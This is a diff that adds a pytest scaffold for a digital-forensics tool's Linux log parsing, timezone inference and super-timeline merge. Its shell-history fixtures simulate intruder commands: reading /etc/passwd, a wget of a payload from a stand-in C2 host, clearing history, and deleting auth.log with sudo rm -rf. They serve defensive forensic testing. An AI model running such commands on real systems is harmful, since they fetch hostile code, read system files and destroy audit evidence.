@@ -1,0 +1,295 @@
+"""RED Wave-0 scaffold for Phase-5 log parsing + normalization + time inference.
+
+These stubs pin the exact pytest node IDs from 05-RESEARCH.md "Validation
+Architecture > Phase Requirements -> Test Map" for the log slices (LOG-01/02/03/
+04, D-45/D-46) plus the TIME-02 super-timeline merge. They reference the
+(not-yet-existing) ``pyautopsy.log`` package — ``log.auth``, ``log.syslog``,
+``log.shell_history``, ``log.timeresolve``, ``log.normalize``, ``log.discover``,
+and ``core.logs`` — so each test FAILS until the Wave-1..3 slices build them.
+
+Following the established Wave-0 idiom (cf. ``tests/test_knownfiles.py``), the
+not-yet-existing modules are imported INSIDE each test body so the file COLLECTS
+cleanly: an in-body ``ImportError`` is a test *failure* (RED), never a collection
+error. None of these are ``xfail``/``skip`` — they are live gates the slices turn
+green.
+
+Ground truth comes from the committed ``log_search_image`` + its
+``log_search_groundtruth`` sidecar (see ``tests/conftest.py``). No ``import
+pytsk3`` here: log parsing is stdlib ``re``/``gzip``/``datetime``/``zoneinfo`` on
+top of the existing FS seam, NOT a native importer (D-14 unaffected).
+"""
+
+from __future__ import annotations
+
+from pathlib import Path
+from typing import Any
+
+from pyautopsy.case import TimelineEvent  # the LOG-04 model already exists
+
+
+def test_rfc3164_grammar() -> None:
+    """LOG-01/02: the RFC3164 line grammar parses the canonical fields exactly.
+
+    The dominant on-disk Linux format is ``Mmm dd HH:MM:SS host program[pid]: msg``
+    (space-padded day, no year, no tz — the reason D-46 inference is required).
+    The parser must surface ts/host/program/pid/msg for a representative line.
+    """
+    from pyautopsy.log import syslog  # noqa: PLC0415 (RED stub)
+
+    line = (
+        "Jan 02 08:05:10 host01 sudo: alice : TTY=pts/0 ; PWD=/home/alice ; "
+        "USER=root ; COMMAND=/usr/bin/apt update"
+    )
+    parsed = syslog.parse_line(line)
+    assert parsed is not None, "RFC3164 line failed to parse"
+    assert parsed.program == "sudo"
+    assert parsed.host == "host01"
+    # The naive wall-clock components must be recoverable (year resolved later).
+    assert "08:05:10" in (parsed.raw_timestamp or "")
+    assert "COMMAND=/usr/bin/apt update" in parsed.message
+
+
+def test_auth_taxonomy(
+    log_search_image: Path, log_search_groundtruth: dict[str, Any]
+) -> None:
+    """LOG-01: auth.log login/SSH/sudo/failed-auth map to honest action/outcome.
+
+    Parses the fixture's live ``/var/log/auth.log`` and asserts the well-known
+    auth shapes (sshd Accepted/Failed-password, sudo authentication failure,
+    PAM session opened/closed) become records carrying descriptive action +
+    outcome (RESEARCH Pattern 4 — describes the observed line, never intent).
+    An unmatched line is still emitted (raw msg in attributes), never dropped.
+    """
+    from pyautopsy.log import auth  # noqa: PLC0415 (RED stub)
+
+    records = list(auth.parse(_AUTH_LIVE_TEXT))
+    pairs = {(r.action, r.outcome) for r in records}
+    # The live auth.log carries a sudo auth FAILURE, a failed ssh password, an
+    # accepted publickey, and a session close.
+    assert ("sudo", "denied") in pairs or ("sudo", "failure") in pairs
+    assert ("ssh-login", "failure") in pairs
+    assert ("ssh-login", "success") in pairs
+    assert any(o in ("closed", "opened") for _, o in pairs)
+    # Every record keeps the raw message — never silently dropped.
+    assert all(getattr(r, "message", None) is not None for r in records)
+
+
+def test_syslog_events() -> None:
+    """LOG-02: syslog/messages yields service/kernel/cron/error events.
+
+    The parser must turn the systemd/kernel/CRON/nginx-error lines into records
+    that carry the program (service) and message; level/facility heuristics may
+    annotate, but program extraction is the load-bearing LOG-02 signal.
+    """
+    from pyautopsy.log import syslog  # noqa: PLC0415 (RED stub)
+
+    records = list(syslog.parse(_SYSLOG_TEXT))
+    programs = {r.program for r in records}
+    assert {"systemd", "kernel", "CRON", "nginx"} <= programs
+    # The error line is preserved verbatim (no intent inferred).
+    assert any("error" in (r.message or "").lower() for r in records)
+
+
+def test_shell_history_tamperability() -> None:
+    """LOG-03: bash/zsh history parsed; no-per-line-timestamp + tamperability flag.
+
+    Bare bash lines have NO reliable per-line timestamp (Pitfall 2) — the parser
+    must flag the fallback rather than invent a time, and surface a tamperability
+    finding (e.g. on ``history -c``). zsh extended lines (``: <ts>:<dur>;cmd``)
+    carry an embedded epoch the parser uses directly.
+    """
+    from pyautopsy.log import shell_history  # noqa: PLC0415 (RED stub)
+
+    bash = shell_history.parse(_BASH_HISTORY_TEXT, kind="bash")
+    zsh = shell_history.parse(_ZSH_HISTORY_TEXT, kind="zsh")
+
+    bash_records = list(bash.records if hasattr(bash, "records") else bash)
+    # At least one bash command line has no per-line timestamp -> flagged fallback.
+    assert any(
+        (getattr(r, "ts_basis", "") or "").startswith("file-mtime-fallback")
+        or getattr(r, "timestamp", None) is None
+        for r in bash_records
+    )
+    # A tamperability finding is surfaced for bash history (D-44, finding only).
+    findings = getattr(bash, "findings", None)
+    assert findings, "expected a shell-history tamperability finding"
+    assert any(
+        "tamper" in str(f).lower() or "history" in str(f).lower() for f in findings
+    )
+
+    # zsh extended lines carry an embedded epoch the parser uses directly.
+    zsh_records = list(zsh.records if hasattr(zsh, "records") else zsh)
+    assert any(getattr(r, "epoch", None) is not None for r in zsh_records)
+
+
+def test_normalize_to_timeline_event() -> None:
+    """LOG-04: a parsed record normalizes to a TimelineEvent with the full shape.
+
+    The produced ``TimelineEvent`` must carry source/event-type/actor/action/
+    outcome/file_id (the reserved Phase-5 columns) and a verbatim UTC ts_utc; the
+    actor is honest (``user=alice``, never ``user=None``). Mirrors
+    ``timeline/builder._explode`` purity.
+    """
+    from pyautopsy.log import normalize  # noqa: PLC0415 (RED stub)
+
+    event = normalize.to_event(
+        _FakeRecord(
+            action="ssh-login",
+            outcome="success",
+            actor="user=alice",
+            message="Accepted publickey for alice from 192.0.2.5",
+        ),
+        evidence_source_id=1,
+        file_id=42,
+        source="auth",
+        log_path="/var/log/auth.log",
+        utc_iso="2026-01-15T07:02:45+00:00",
+        attrs={
+            "timestamp_source": "log:inferred-tz",
+            "assumed_timezone": "America/New_York",
+        },
+    )
+    assert isinstance(event, TimelineEvent)
+    assert event.source == "auth"
+    assert event.action == "ssh-login"
+    assert event.outcome == "success"
+    assert event.actor == "user=alice"
+    assert event.file_id == 42
+    assert event.meta_addr is None  # log events have no inode
+    assert event.ts_utc == "2026-01-15T07:02:45+00:00"  # verbatim, never re-derived
+
+
+def test_timeresolve_inferred_and_flagged(
+    log_search_image: Path, log_search_groundtruth: dict[str, Any]
+) -> None:
+    """D-46: tz inferred from /etc/localtime, year inferred, BOTH flagged; UTC warned.
+
+    The host timezone is derived from the image (``/etc/localtime`` symlink ->
+    ``/etc/timezone`` fallback) and recorded as ``America/New_York``; the RFC3164
+    year is inferred from file mtime + rotation order. Both inferences are FLAGGED
+    in the event attributes (never silent — the CR-01 lesson). When the zone is
+    undeterminable the resolver falls back to UTC WITH an explicit warning flag.
+    """
+    from pyautopsy.log import timeresolve  # noqa: PLC0415 (RED stub)
+
+    gt = log_search_groundtruth
+
+    # 1. Inferred zone is flagged, not silently applied.
+    iso, attrs = timeresolve.to_utc(
+        _naive("Jan 15 02:02:45", year=gt["year"]),
+        host_tz=timeresolve.zone(gt["timezone"]),
+    )
+    assert attrs.get("timestamp_source") == "log:inferred-tz"
+    assert attrs.get("assumed_timezone") == gt["timezone"]
+    assert iso.endswith("+00:00")
+
+    # 2. UTC fallback is explicitly warned, never silent.
+    _iso2, attrs2 = timeresolve.to_utc(
+        _naive("Jan 15 02:02:45", year=gt["year"]), host_tz=None
+    )
+    assert attrs2.get("timestamp_source") == "log:assumed-utc"
+    assert "warning" in " ".join(str(v) for v in attrs2.values()).lower()
+
+
+def test_rotation_reassembly_order(
+    log_search_image: Path, log_search_groundtruth: dict[str, Any]
+) -> None:
+    """D-45/Pitfall 4: rotated `.1`/`.2.gz` reassembled oldest->newest + completeness.
+
+    ``auth.log.2.gz`` (Dec, prev year) precedes ``auth.log.1`` (early Jan) which
+    precedes the live ``auth.log`` (later Jan). The discover step must order the
+    members oldest->newest (NOT lexically) — load-bearing for year inference and
+    the CR-01 deterministic insert order — and surface a log-completeness finding.
+    """
+    from pyautopsy.log import discover  # noqa: PLC0415 (RED stub)
+
+    members = discover.order_rotated_set(
+        log_search_groundtruth["auth_log_members_oldest_to_newest"][
+            ::-1
+        ]  # feed shuffled
+    )
+    paths = [m.path if hasattr(m, "path") else m for m in members]
+    assert paths == log_search_groundtruth["auth_log_members_oldest_to_newest"]
+
+
+def test_super_timeline_merge(log_search_image: Path, case_dir: Path) -> None:
+    """TIME-02: get_timeline_events returns fs + log events in one UTC total order.
+
+    After ingest + walk (filesystem events) and ``run_logs`` (log events written
+    into the SAME ``timeline_events`` table), the existing D-26 ordered read IS
+    the super-timeline: a single UTC-sorted sequence containing BOTH a filesystem
+    event and a log event, with NO new ordering code (D-47).
+    """
+    from pyautopsy.case import CaseStore  # noqa: PLC0415
+    from pyautopsy.core.ingest import run_ingest  # noqa: PLC0415
+    from pyautopsy.core.logs import run_logs  # noqa: PLC0415 (RED stub)
+    from pyautopsy.core.walk import run_walk  # noqa: PLC0415
+
+    ingested = run_ingest(log_search_image, case_dir, examiner="X", evidence_id="E1")
+    run_walk(log_search_image, case_dir, timezone="UTC")
+    run_logs(log_search_image, case_dir, evidence_source_id=ingested.evidence_source_id)
+
+    with CaseStore.open(case_dir) as store:
+        events = store.get_timeline_events(ingested.evidence_source_id)
+
+    sources = {e.source for e in events}
+    assert any(s.startswith("filesystem") for s in sources), "missing filesystem events"
+    assert sources & {"auth", "syslog", "shell-history"}, "missing log events"
+    # One UTC total order: ts_utc is non-decreasing across the merged sequence.
+    stamps = [e.ts_utc for e in events]
+    assert stamps == sorted(stamps), "merged super-timeline is not UTC-ordered"
+    assert all(s.endswith("+00:00") for s in stamps)
+
+
+# ---------------------------------------------------------------------------
+# Local helpers + fixture text mirrors (kept inline so the file is self-contained
+# and the stubs reference real, eventual symbols rather than magic strings).
+# ---------------------------------------------------------------------------
+
+_AUTH_LIVE_TEXT = (
+    "Jan 15 02:00:00 host01 sudo: pam_unix(sudo:auth): authentication failure; "
+    "logname=alice uid=1000 euid=0 tty=/dev/pts/1 ruser=alice rhost= user=alice\n"
+    "Jan 15 02:01:30 host01 sshd[6001]: Failed password for alice from "
+    "203.0.113.9 port 40000 ssh2\n"
+    "Jan 15 02:02:45 host01 sshd[6002]: Accepted publickey for alice from "
+    "192.0.2.5 port 40002 ssh2\n"
+    "Jan 15 02:05:00 host01 sshd[6001]: session closed for user alice\n"
+)
+
+_SYSLOG_TEXT = (
+    "Jan 15 01:00:00 host01 systemd[1]: Started Daily apt download activities.\n"
+    "Jan 15 01:00:05 host01 kernel: [12345.6789] usb 1-1: new high-speed USB device\n"
+    "Jan 15 01:30:00 host01 CRON[7001]: (root) CMD (/usr/bin/backup.sh)\n"
+    "Jan 15 02:10:00 host01 nginx[8001]: error: upstream timed out\n"
+)
+
+_BASH_HISTORY_TEXT = (
+    "ls -la\n"
+    "cat /etc/passwd\n"
+    "#1736899200\n"
+    "wget http://evil-c2.example.invalid/payload.sh\n"
+    "history -c\n"
+)
+
+_ZSH_HISTORY_TEXT = (
+    ": 1736899300:0;whoami\n: 1736899305:2;sudo rm -rf /var/log/auth.log\n"
+)
+
+
+def _naive(month_day_time: str, *, year: int) -> Any:
+    """Parse an RFC3164 ``Mmm dd HH:MM:SS`` head into a naive datetime at ``year``."""
+    from datetime import datetime  # noqa: PLC0415
+
+    return datetime.strptime(f"{year} {month_day_time}", "%Y %b %d %H:%M:%S")
+
+
+class _FakeRecord:
+    """A minimal parsed-record stand-in for the LOG-04 normalize contract."""
+
+    def __init__(self, **kw: Any) -> None:
+        self.action = kw.get("action")
+        self.outcome = kw.get("outcome")
+        self.actor = kw.get("actor")
+        self.message = kw.get("message")
+        self.volume_id = 0
+        self.volume_offset = 0
